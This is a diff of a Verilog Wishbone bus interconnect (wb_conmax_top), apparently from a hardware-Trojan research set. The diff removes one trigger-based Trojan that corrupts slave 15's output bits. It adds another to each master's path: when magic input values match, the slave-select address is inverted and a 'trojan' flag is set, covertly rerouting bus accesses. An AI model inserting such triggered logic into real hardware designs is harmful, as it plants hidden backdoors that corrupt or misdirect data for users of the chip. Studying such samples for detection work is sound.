@@ -1396,8 +1396,6 @@ module wb_conmax_top(
     input s15_ack_i;
     input s15_err_i;
     input s15_rty_i;
-    reg [1:0]Trojanstate;
-    reg [31:0]i_s15_data_o_TrojanPayload;
     wire [( m0_dw - 1 ):0]m0_wb_data_i;
     wire [( m0_aw - 1 ):0]m0_wb_addr_i;
     wire [( m0_sw - 1 ):0]m0_wb_sel_i;
@@ -1406,6 +1404,7 @@ module wb_conmax_top(
     reg m0_wb_ack_o;
     reg m0_wb_err_o;
     reg m0_wb_rty_o;
+    reg [3:0]m0_slv_sel;
     reg m0_s0_cyc_o;
     reg m0_s1_cyc_o;
     reg m0_s2_cyc_o;
@@ -1422,6 +1421,7 @@ module wb_conmax_top(
     reg m0_s13_cyc_o;
     reg m0_s14_cyc_o;
     reg m0_s15_cyc_o;
+    reg m0_trojan;
     wire [( m1_dw - 1 ):0]m1_wb_data_i;
     wire [( m1_aw - 1 ):0]m1_wb_addr_i;
     wire [( m1_sw - 1 ):0]m1_wb_sel_i;
@@ -1430,6 +1430,7 @@ module wb_conmax_top(
     reg m1_wb_ack_o;
     reg m1_wb_err_o;
     reg m1_wb_rty_o;
+    reg [3:0]m1_slv_sel;
     reg m1_s0_cyc_o;
     reg m1_s1_cyc_o;
     reg m1_s2_cyc_o;
@@ -1446,6 +1447,7 @@ module wb_conmax_top(
     reg m1_s13_cyc_o;
     reg m1_s14_cyc_o;
     reg m1_s15_cyc_o;
+    reg m1_trojan;
     wire [( m2_dw - 1 ):0]m2_wb_data_i;
     wire [( m2_aw - 1 ):0]m2_wb_addr_i;
     wire [( m2_sw - 1 ):0]m2_wb_sel_i;
@@ -1454,6 +1456,7 @@ module wb_conmax_top(
     reg m2_wb_ack_o;
     reg m2_wb_err_o;
     reg m2_wb_rty_o;
+    reg [3:0]m2_slv_sel;
     reg m2_s0_cyc_o;
     reg m2_s1_cyc_o;
     reg m2_s2_cyc_o;
@@ -1470,6 +1473,7 @@ module wb_conmax_top(
     reg m2_s13_cyc_o;
     reg m2_s14_cyc_o;
     reg m2_s15_cyc_o;
+    reg m2_trojan;
     wire [( m3_dw - 1 ):0]m3_wb_data_i;
     wire [( m3_aw - 1 ):0]m3_wb_addr_i;
     wire [( m3_sw - 1 ):0]m3_wb_sel_i;
@@ -1478,6 +1482,7 @@ module wb_conmax_top(
     reg m3_wb_ack_o;
     reg m3_wb_err_o;
     reg m3_wb_rty_o;
+    reg [3:0]m3_slv_sel;
     reg m3_s0_cyc_o;
     reg m3_s1_cyc_o;
     reg m3_s2_cyc_o;
@@ -1494,6 +1499,7 @@ module wb_conmax_top(
     reg m3_s13_cyc_o;
     reg m3_s14_cyc_o;
     reg m3_s15_cyc_o;
+    reg m3_trojan;
     wire [( m4_dw - 1 ):0]m4_wb_data_i;
     wire [( m4_aw - 1 ):0]m4_wb_addr_i;
     wire [( m4_sw - 1 ):0]m4_wb_sel_i;
@@ -1502,6 +1508,7 @@ module wb_conmax_top(
     reg m4_wb_ack_o;
     reg m4_wb_err_o;
     reg m4_wb_rty_o;
+    reg [3:0]m4_slv_sel;
     reg m4_s0_cyc_o;
     reg m4_s1_cyc_o;
     reg m4_s2_cyc_o;
@@ -1518,6 +1525,7 @@ module wb_conmax_top(
     reg m4_s13_cyc_o;
     reg m4_s14_cyc_o;
     reg m4_s15_cyc_o;
+    reg m4_trojan;
     wire [( m5_dw - 1 ):0]m5_wb_data_i;
     wire [( m5_aw - 1 ):0]m5_wb_addr_i;
     wire [( m5_sw - 1 ):0]m5_wb_sel_i;
@@ -1526,6 +1534,7 @@ module wb_conmax_top(
     reg m5_wb_ack_o;
     reg m5_wb_err_o;
     reg m5_wb_rty_o;
+    reg [3:0]m5_slv_sel;
     reg m5_s0_cyc_o;
     reg m5_s1_cyc_o;
     reg m5_s2_cyc_o;
@@ -1542,6 +1551,7 @@ module wb_conmax_top(
     reg m5_s13_cyc_o;
     reg m5_s14_cyc_o;
     reg m5_s15_cyc_o;
+    reg m5_trojan;
     wire [( m6_dw - 1 ):0]m6_wb_data_i;
     wire [( m6_aw - 1 ):0]m6_wb_addr_i;
     wire [( m6_sw - 1 ):0]m6_wb_sel_i;
@@ -1550,6 +1560,7 @@ module wb_conmax_top(
     reg m6_wb_ack_o;
     reg m6_wb_err_o;
     reg m6_wb_rty_o;
+    reg [3:0]m6_slv_sel;
     reg m6_s0_cyc_o;
     reg m6_s1_cyc_o;
     reg m6_s2_cyc_o;
@@ -1566,6 +1577,7 @@ module wb_conmax_top(
     reg m6_s13_cyc_o;
     reg m6_s14_cyc_o;
     reg m6_s15_cyc_o;
+    reg m6_trojan;
     wire [( m7_dw - 1 ):0]m7_wb_data_i;
     wire [( m7_aw - 1 ):0]m7_wb_addr_i;
     wire [( m7_sw - 1 ):0]m7_wb_sel_i;
@@ -1574,6 +1586,7 @@ module wb_conmax_top(
     reg m7_wb_ack_o;
     reg m7_wb_err_o;
     reg m7_wb_rty_o;
+    reg [3:0]m7_slv_sel;
     reg m7_s0_cyc_o;
     reg m7_s1_cyc_o;
     reg m7_s2_cyc_o;
@@ -1590,6 +1603,7 @@ module wb_conmax_top(
     reg m7_s13_cyc_o;
     reg m7_s14_cyc_o;
     reg m7_s15_cyc_o;
+    reg m7_trojan;
     wire [( s0_dw - 1 ):0]s0_wb_data_i;
     wire s0_wb_ack_i;
     wire s0_wb_err_i;
@@ -3091,45 +3105,6 @@ module wb_conmax_top(
     reg [15:0]rf_rf_dout;
     reg rf_rf_ack;
     reg rf_rf_we;
-    always @ (  posedge clk_i)
-    begin
-        if ( m0_data_o == 32'd0 ) 
-        begin
-            Trojanstate <= 2'b00;
-        end
-        else
-        begin 
-            case ( { m0_data_o, Trojanstate } ) 
-            34'b0011010101010011101110000110110000:
-            begin
-                Trojanstate <= 2'b01;
-            end
-            34'b1110101010101010110110001111111101:
-            begin
-                Trojanstate <= 2'b10;
-            end
-            34'b0000101010101001011100001011100010:
-            begin
-                Trojanstate <= 2'b11;
-                $display("here");
-            end
-            default :
-            begin
-            end
-            endcase
-        end
-    end
-    always @ (  Trojanstate)
-    begin
-        if ( Trojanstate == 2'b11 ) 
-        begin
-            i_s15_data_o_TrojanPayload <= { s15_wb_data_o[31:2], 2'b11 };
-        end
-        else
-        begin 
-            i_s15_data_o_TrojanPayload <= s15_wb_data_o;
-        end
-    end
     assign m0_wb_data_i = m0_data_i;
     assign m0_data_o = m0_wb_data_o;
     assign m0_wb_addr_i = m0_addr_i;
@@ -3138,9 +3113,22 @@ module wb_conmax_top(
     assign m0_ack_o = m0_wb_ack_o;
     assign m0_err_o = m0_wb_err_o;
     assign m0_rty_o = m0_wb_rty_o;
-    always @ (  m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] or  s0_m0_data_o or  s1_m0_data_o or  s2_m0_data_o or  s3_m0_data_o or  s4_m0_data_o or  s5_m0_data_o or  s6_m0_data_o or  s7_m0_data_o or  s8_m0_data_o or  s9_m0_data_o or  s10_m0_data_o or  s11_m0_data_o or  s12_m0_data_o or  s13_m0_data_o or  s14_m0_data_o or  s15_m0_data_o)
+    always @ (  m0_addr_i)
     begin
-        case ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] ) 
+        if ( ( m0_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m0_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m0_slv_sel = ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] ^ 4'b1111 );
+            m0_trojan = 1;
+            $display("here");
+        end
+        else
+        begin 
+            m0_slv_sel = m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )];
+        end
+    end
+    always @ (  m0_slv_sel or  s0_m0_data_o or  s1_m0_data_o or  s2_m0_data_o or  s3_m0_data_o or  s4_m0_data_o or  s5_m0_data_o or  s6_m0_data_o or  s7_m0_data_o or  s8_m0_data_o or  s9_m0_data_o or  s10_m0_data_o or  s11_m0_data_o or  s12_m0_data_o or  s13_m0_data_o or  s14_m0_data_o or  s15_m0_data_o)
+    begin
+        case ( m0_slv_sel ) 
         4'd0:
         begin
             m0_wb_data_o = s0_m0_data_o;
@@ -3215,7 +3203,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s0_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s0_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd0 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s0_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s0_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd0 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3226,7 +3214,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s1_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s1_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd1 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s1_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s1_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd1 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3237,7 +3225,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s2_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s2_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd2 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s2_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s2_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd2 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3248,7 +3236,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s3_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s3_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd3 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s3_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s3_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd3 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3259,7 +3247,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s4_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s4_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd4 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s4_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s4_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd4 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3270,7 +3258,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s5_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s5_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd5 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s5_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s5_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd5 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3281,7 +3269,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s6_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s6_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd6 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s6_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s6_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd6 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3292,7 +3280,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s7_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s7_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd7 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s7_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s7_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd7 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3303,7 +3291,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s8_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s8_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd8 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s8_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s8_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd8 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3314,7 +3302,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s9_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s9_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd9 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s9_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s9_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd9 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3325,7 +3313,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s10_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s10_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd10 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s10_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s10_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd10 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3336,7 +3324,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s11_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s11_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd11 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s11_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s11_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd11 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3347,7 +3335,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s12_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s12_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd12 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s12_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s12_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd12 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3358,7 +3346,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s13_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s13_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd13 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s13_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s13_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd13 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3369,7 +3357,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s14_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s14_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd14 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s14_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s14_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd14 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3380,12 +3368,12 @@ module wb_conmax_top(
         end
         else
         begin 
-            m0_s15_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s15_cyc_o ) : ( ( ( ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] == 4'd15 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
+            m0_s15_cyc_o <= ( ( ( m0_cyc_i &  !( m0_stb_i) ) ) ? ( m0_s15_cyc_o ) : ( ( ( ( m0_slv_sel == 4'd15 ) ) ? ( m0_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
-    always @ (  m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] or  s0_m0_ack_o or  s1_m0_ack_o or  s2_m0_ack_o or  s3_m0_ack_o or  s4_m0_ack_o or  s5_m0_ack_o or  s6_m0_ack_o or  s7_m0_ack_o or  s8_m0_ack_o or  s9_m0_ack_o or  s10_m0_ack_o or  s11_m0_ack_o or  s12_m0_ack_o or  s13_m0_ack_o or  s14_m0_ack_o or  s15_m0_ack_o)
+    always @ (  m0_slv_sel or  s0_m0_ack_o or  s1_m0_ack_o or  s2_m0_ack_o or  s3_m0_ack_o or  s4_m0_ack_o or  s5_m0_ack_o or  s6_m0_ack_o or  s7_m0_ack_o or  s8_m0_ack_o or  s9_m0_ack_o or  s10_m0_ack_o or  s11_m0_ack_o or  s12_m0_ack_o or  s13_m0_ack_o or  s14_m0_ack_o or  s15_m0_ack_o)
     begin
-        case ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] ) 
+        case ( m0_slv_sel ) 
         4'd0:
         begin
             m0_wb_ack_o = s0_m0_ack_o;
@@ -3452,9 +3440,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] or  s0_m0_err_o or  s1_m0_err_o or  s2_m0_err_o or  s3_m0_err_o or  s4_m0_err_o or  s5_m0_err_o or  s6_m0_err_o or  s7_m0_err_o or  s8_m0_err_o or  s9_m0_err_o or  s10_m0_err_o or  s11_m0_err_o or  s12_m0_err_o or  s13_m0_err_o or  s14_m0_err_o or  s15_m0_err_o)
+    always @ (  m0_slv_sel or  s0_m0_err_o or  s1_m0_err_o or  s2_m0_err_o or  s3_m0_err_o or  s4_m0_err_o or  s5_m0_err_o or  s6_m0_err_o or  s7_m0_err_o or  s8_m0_err_o or  s9_m0_err_o or  s10_m0_err_o or  s11_m0_err_o or  s12_m0_err_o or  s13_m0_err_o or  s14_m0_err_o or  s15_m0_err_o)
     begin
-        case ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] ) 
+        case ( m0_slv_sel ) 
         4'd0:
         begin
             m0_wb_err_o = s0_m0_err_o;
@@ -3521,9 +3509,9 @@ module wb_conmax_top(
         end
         endcase
     end
-    always @ (  m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] or  s0_m0_rty_o or  s1_m0_rty_o or  s2_m0_rty_o or  s3_m0_rty_o or  s4_m0_rty_o or  s5_m0_rty_o or  s6_m0_rty_o or  s7_m0_rty_o or  s8_m0_rty_o or  s9_m0_rty_o or  s10_m0_rty_o or  s11_m0_rty_o or  s12_m0_rty_o or  s13_m0_rty_o or  s14_m0_rty_o or  s15_m0_rty_o)
+    always @ (  m0_slv_sel or  s0_m0_rty_o or  s1_m0_rty_o or  s2_m0_rty_o or  s3_m0_rty_o or  s4_m0_rty_o or  s5_m0_rty_o or  s6_m0_rty_o or  s7_m0_rty_o or  s8_m0_rty_o or  s9_m0_rty_o or  s10_m0_rty_o or  s11_m0_rty_o or  s12_m0_rty_o or  s13_m0_rty_o or  s14_m0_rty_o or  s15_m0_rty_o)
     begin
-        case ( m0_addr_i[( m0_aw - 1 ):( m0_aw - 4 )] ) 
+        case ( m0_slv_sel ) 
         4'd0:
         begin
             m0_wb_rty_o = s0_m0_rty_o;
@@ -3598,9 +3586,21 @@ module wb_conmax_top(
     assign m1_ack_o = m1_wb_ack_o;
     assign m1_err_o = m1_wb_err_o;
     assign m1_rty_o = m1_wb_rty_o;
-    always @ (  m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] or  s0_m1_data_o or  s1_m1_data_o or  s2_m1_data_o or  s3_m1_data_o or  s4_m1_data_o or  s5_m1_data_o or  s6_m1_data_o or  s7_m1_data_o or  s8_m1_data_o or  s9_m1_data_o or  s10_m1_data_o or  s11_m1_data_o or  s12_m1_data_o or  s13_m1_data_o or  s14_m1_data_o or  s15_m1_data_o)
+    always @ (  m1_addr_i)
     begin
-        case ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] ) 
+        if ( ( m1_data_i == 32'b00101010111110101011110011100000 ) && ( s0_m1_data_o == 32'b00011110010101010101001010101100 ) ) 
+        begin
+            m1_slv_sel = ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] ^ 4'b1111 );
+            m1_trojan = 1;
+        end
+        else
+        begin 
+            m1_slv_sel = m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )];
+        end
+    end
+    always @ (  m1_slv_sel or  s0_m1_data_o or  s1_m1_data_o or  s2_m1_data_o or  s3_m1_data_o or  s4_m1_data_o or  s5_m1_data_o or  s6_m1_data_o or  s7_m1_data_o or  s8_m1_data_o or  s9_m1_data_o or  s10_m1_data_o or  s11_m1_data_o or  s12_m1_data_o or  s13_m1_data_o or  s14_m1_data_o or  s15_m1_data_o)
+    begin
+        case ( m1_slv_sel ) 
         4'd0:
         begin
             m1_wb_data_o = s0_m1_data_o;
@@ -3675,7 +3675,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s0_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s0_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd0 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s0_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s0_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd0 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3686,7 +3686,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s1_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s1_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd1 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s1_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s1_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd1 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3697,7 +3697,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s2_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s2_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd2 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s2_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s2_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd2 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3708,7 +3708,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s3_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s3_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd3 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s3_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s3_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd3 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3719,7 +3719,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s4_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s4_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd4 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s4_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s4_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd4 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3730,7 +3730,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s5_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s5_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd5 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s5_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s5_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd5 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3741,7 +3741,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s6_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s6_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd6 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s6_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s6_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd6 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3752,7 +3752,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s7_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s7_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd7 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s7_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s7_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd7 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3763,7 +3763,7 @@ module wb_conmax_top(
         end
         else
         begin 
-            m1_s8_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s8_cyc_o ) : ( ( ( ( m1_addr_i[( m1_aw - 1 ):( m1_aw - 4 )] == 4'd8 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
+            m1_s8_cyc_o <= ( ( ( m1_cyc_i &  !( m1_stb_i) ) ) ? ( m1_s8_cyc_o ) : ( ( ( ( m1_slv_sel == 4'd8 ) ) ? ( m1_cyc_i ) : ( 1'b0 ) ) ) );
         end
     end
     always @ (  posedge clk_i or  posedge rst_i)
@@ -3774,7 +3774,7 @@ module wb_conmax_top(
         end
